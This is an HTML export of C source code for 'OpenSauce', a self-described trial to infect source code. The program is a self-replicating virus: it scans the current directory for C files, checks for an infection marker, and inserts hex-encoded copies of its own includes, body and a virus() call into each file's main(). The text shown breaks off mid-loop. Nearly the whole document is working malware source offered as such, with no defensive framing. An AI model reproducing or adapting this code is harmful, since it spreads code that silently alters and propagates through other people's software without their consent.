<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
 * OpenSauce,
 *
 * A trial to infect source code
 *                   zert &lt;zert@int80h.net&gt;
 *
 */</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;time.h&gt;
#include &lt;dirent.h&gt;
#include &lt;elf.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virus</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">virus</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virus</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readbyte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">writebyte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">posmain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">posbuffer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DIR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">dd</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirp</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">nibblechar</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">readbuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">writebuffer</span><span class="sc10">,</span><span class="sc0"> 
       </span><span class="sc10">*</span><span class="sc11">readmain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">writemain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">bufname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buffer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">charinclude</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"23696e636c756465203c737464696f2e683e0a23696e636c756465203c7374646c69622e683e0a23696e636c756465203c7379732f737461742e683e0a23696e636c756465203c756e697374642e683e0a23696e636c756465203c66636e746c2e683e0a23696e636c756465203c74696d652e683e0a23696e636c756465203c646972656e742e683e0a23696e636c756465203c656c662e683e0a23696e636c756465203c7379732f74797065732e683e0a23696e636c756465203c7379732f776169742e683e0a0a766f696420766972757328293b0a0a"</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">charvirus</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"0a766f69642076697275732829207b0a2020696e7420692c2068642c2066642c2072656164627974652c207772697465627974652c20706f736d61696e2c20706f736275666665723b0a2020444952202a64643b0a202073747275637420646972656e74202a646972703b0a202063686172206e6962626c655b325d2c206e6962626c65636861722c202a726561646275666665722c202a77726974656275666665722c200a202020202020202a726561646d61696e2c202a77726974656d61696e2c202a6275666e616d652c202a6275666665723b0a"</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">charvirusend</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"0a20206464203d206f70656e64697228222e22293b0a20207768696c65282864697270203d207265616464697228646429293e3029200a202020206966282868643d6f70656e28646972702d3e645f6e616d652c204f5f524457522c203029293e3d3029207b0a2020202020206966282866643d6f70656e28646972702d3e645f6e616d652c204f5f524457522c203029293e3d3029207b0a20202020202020206966282128737472636d7028646972702d3e645f6e616d652b7374726c656e28646972702d3e645f6e616d65292d322c222e632229297c7c0a092020202128737472636d7028646972702d3e645f6e616d652b7374726c656e28646972702d3e645f6e616d65292d322c222e4322292929207b0a0920206c7365656b2866642c202d33302c205345454b5f454e44293b0a0920206275666e616d65203d202863686172202a296d616c6c6f63283330293b0a0920207265616462797465203d20726561642866642c206275666e616d652c3330293b0a09202069662828737472737472286275666e616d652c20222f2a20736175636521202a2f22293c3d302929207b0a09202020206c7365656b2866642c20302c205345454b5f534554293b0a0920202020706f736d61696e203d20706f73627566666572203d20303b0a202020202020202020202020627566666572203d202863686172202a296d616c6c6f632831303234293b0a09202020207768696c65282872656164627974653d726561642866642c6275666665722c3130323429293e3029207b0a09202020202020696628202828706f736275666665723d737472737472286275666665722c225c6e6d61696e282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e696e74206d61696e282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e766f6964206d61696e282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e6d61696e20282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e696e74206d61696e20282229293e3029207c7c0a0920202020202020202828706f736275666665723d737472737472286275666665722c225c6e766f6964206d61696e20282229293e30292029207b0a0909627265616b3b0a092020202020207d0a09202020202020706f736d61696e202b3d2072656164627974653b0a09202020207d0a0920202020696628706f736275666665723e3029207b0a09202020202020706f736d61696e202b3d202828696e7429706f736275666665722d28696e7429627566666572293b0a092020202020206c7365656b2866642c20706f736d61696e2c205345454b5f534554293b0a09202020202020726561642866642c206275666665722c203830293b200a0920202020202069662828706f73627566666572203d20737472737472286275666665722c227b5c6e2229293e30290a20202020202020202020202020202020706f736d61696e202b3d2032202b202828696e7429706f736275666665722d28696e7429627566666572293b0a09202020202020656c73650a092020202020202020706f736d61696e203d202d313b0a09202020207d20656c736520706f736d61696e203d202d313b0a0920202020696628706f736d61696e3e3029207b0a092020202020206c7365656b2866642c20302c205345454b5f534554293b0a09202020202020777269746562797465203d207374726c656e2863686172696e636c75646529202f20323b0a202020202020202020202020202072656164627566666572203d202863686172202a296d616c6c6f6328777269746562797465293b0a20202020202020202020202020207772697465627566666572203d202863686172202a296d616c6c6f6328777269746562797465293b0a2020202020202020202020202020666f7228693d303b693c7374726c656e2863686172696e636c756465293b692b3d3229207b0a0920202020202020206e6962626c655b305d203d2063686172696e636c7564655b695d3b0a0920202020202020206e6962626c655b315d203d2063686172696e636c7564655b692b315d3b0a092020202020202020737363616e66286e6962626c652c202225303258222c20266e6962626c6563686172293b0a202020202020202020202020202020207374726e6361742877726974656275666665722c20266e6962626c65636861722c2031293b0a092020202020207d0a092020202020207768696c65282872656164627974653d726561642866642c726561646275666665722c77726974656279746529293e3029207b0a20200920202020202020206c7365656b2866642c202d72656164627974652c205345454b5f435552293b0a09202020202020202077726974652866642c2077726974656275666665722c20777269746562797465293b0a092020202020202020777269746562797465203d20726561642866642c2077726974656275666665722c20777269746562797465293b200a202020202020202020202020202020206c7365656b2866642c202d7772697465627974652c205345454b5f435552293b0a09202020202020202077726974652866642c20726561646275666665722c207265616462797465293b0a092020202020207d0a20202020202020202020202020206c7365656b2866642c2d72656164627974652c5345454b5f435552293b0a0920202020202077726974652866642c77726974656275666665722c777269746562797465293b0a09202020202020777269746562797465203d207374726c656e2863686172696e636c75646529202f20323b0a092020202020206c7365656b2866642c20706f736d61696e2b7772697465627974652c205345454b5f534554293b0a09202020202020777269746562797465203d207374726c656e28225c6e2020766972757328293b5c6e22293b0a2020202020202020202020202020726561646d61696e203d202863686172202a296d616c6c6f6328777269746562797465293b0a202020202020202020202020202077726974656d61696e203d202863686172202a296d616c6c6f6328777269746562797465293b0a092020202020207374726370792877726974656d61696e2c225c6e2020766972757328293b5c6e22293b0a092020202020207768696c65282872656164627974653d726561642866642c726561646d61696e2c77726974656279746529293e3029207b0a20200920202020202020206c7365656b2866642c2d72656164627974652c5345454b5f435552293b0a09202020202020202077726974652866642c77726974656d61696e2c777269746562797465293b0a0920202020202020207772697465627974653d726561642866642c77726974656d61696e2c777269746562797465293b200a202020202020202020202020202020206c7365656b2866642c2d7772697465627974652c5345454b5f435552293b0a09202020202020202077726974652866642c726561646d61696e2c7265616462797465293b0a092020202020207d0a20202020202020202020202020206c7365656b2866642c2d72656164627974652c5345454b5f435552293b0a0920202020202077726974652866642c77726974656d61696e2c777269746562797465293b0a092020202020206c7365656b2866642c20302c205345454b5f454e44293b0a2020202020202020202020202020666f7228693d303b693c7374726c656e28636861727669727573293b692b3d3229207b0a0920202020202020206e6962626c655b305d203d206368617276697275735b695d3b0a0920202020202020206e6962626c655b315d203d206368617276697275735b692b315d3b0a092020202020202020737363616e66286e6962626c652c2225303258222c266e6962626c6563686172293b0a2020202020202020202020202020202077726974652866642c20266e6962626c65636861722c2031293b0a092020202020207d0a202020202020202020202020202077726974652866642c20225c6e2020636861722063686172696e636c7564655b5d203d205c22222c207374726c656e28225c6e2020636861722063686172696e636c7564655b5d203d205c222229293b0a202020202020202020202020202077726974652866642c2063686172696e636c7564652c207374726c656e2863686172696e636c75646529293b0a202020202020202020202020202077726974652866642c20225c223b5c6e202063686172206368617276697275735b5d203d205c22222c207374726c656e28225c223b5c6e202063686172206368617276697275735b5d203d205c222229293b0a202020202020202020202020202077726974652866642c206368617276697275732c207374726c656e2863686172766972757329293b0a202020202020202020202020202077726974652866642c20225c223b5c6e20206368617220636861727669727573656e645b5d203d205c22222c207374726c656e28225c223b5c6e20206368617220636861727669727573656e645b5d203d205c222229293b0a202020202020202020202020202077726974652866642c20636861727669727573656e642c207374726c656e28636861727669727573656e6429293b0a202020202020202020202020202077726974652866642c20225c223b5c6e222c207374726c656e28225c223b5c6e2229293b0a092020202020206c7365656b2866642c20302c205345454b5f454e44293b0a2020202020202020202020202020666f7228693d303b693c7374726c656e28636861727669727573656e64293b692b3d3229207b0a0920202020202020206e6962626c655b305d203d20636861727669727573656e645b695d3b0a0920202020202020206e6962626c655b315d203d20636861727669727573656e645b692b315d3b0a092020202020202020737363616e66286e6962626c652c2225303258222c266e6962626c6563686172293b0a2020202020202020202020202020202077726974652866642c20266e6962626c65636861722c2031293b0a092020202020207d0a2020202020202020202020202020636c6f7365286664293b0a09202020207d0a0920207d0a097d0a2020202020207d0a202020202020636c6f7365286864293b0a202020207d0a2020636c6f7365646972286464293b0a20202f2a20736175636521202a2f0a7d0a"</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc1">/* scan for hosts in current dir */</span><span class="sc0">
  </span><span class="sc19">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">opendir</span><span class="sc10">(</span><span class="sc6">"."</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">dirp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc19">dd</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
      </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_RDWR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))&gt;=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* is a C source file? */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">".c"</span><span class="sc10">))||</span><span class="sc0">
       </span><span class="sc10">!(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)-</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc6">".C"</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc1">/* searching infection mark... */</span><span class="sc0"> 
      </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">30</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">bufname</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">30</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">readbyte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bufname</span><span class="sc10">,</span><span class="sc4">30</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">bufname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"/* sauce! */"</span><span class="sc10">)&lt;=</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* infection mark not found */</span><span class="sc0">
        </span><span class="sc1">/* searching main() function... */</span><span class="sc0">
        </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">posmain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">posbuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">buffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">readbyte</span><span class="sc10">=</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\nmain("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\nint main("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\nvoid main("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\nmain ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\nint main ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc10">=(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\nvoid main ("</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc11">posmain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">readbyte</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">posbuffer</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">posmain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">posbuffer</span><span class="sc10">-(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">posmain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">80</span><span class="sc10">);</span><span class="sc0"> 
          </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">posbuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"{\n"</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">posmain</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">posbuffer</span><span class="sc10">-(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">buffer</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc11">posmain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">posmain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">posmain</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc1">/* let's infect! */</span><span class="sc0">
          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">writebyte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charinclude</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
              </span><span class="sc11">readbuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc11">writebuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charinclude</span><span class="sc10">);</span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">charinclude</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">nibble</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">charinclude</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">nibble</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%02X"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nibblechar</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strncat</span><span class="sc10">(</span><span class="sc11">writebuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nibblechar</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">readbyte</span><span class="sc10">=</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">readbuffer</span><span class="sc10">,</span><span class="sc11">writebyte</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">readbyte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_CUR</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">writebuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">writebyte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">writebuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">writebyte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_CUR</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readbuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">readbyte</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
              </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,-</span><span class="sc11">readbyte</span><span class="sc10">,</span><span class="sc11">SEEK_CUR</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">writebuffer</span><span class="sc10">,</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc1">/* call virus from main() */</span><span class="sc0">
          </span><span class="sc11">writebyte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">charinclude</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">posmain</span><span class="sc10">+</span><span class="sc11">writebyte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">writebyte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"\n  virus();\n"</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc11">readmain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc11">writemain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">writebyte</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">writemain</span><span class="sc10">,</span><span class="sc6">"\n  virus();\n"</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">while</span><span class="sc10">((</span><span class="sc11">readbyte</span><span class="sc10">=</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">readmain</span><span class="sc10">,</span><span class="sc11">writebyte</span><span class="sc10">))&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,-</span><span class="sc11">readbyte</span><span class="sc10">,</span><span class="sc11">SEEK_CUR</span><span class="sc10">);</span><span class="sc0">
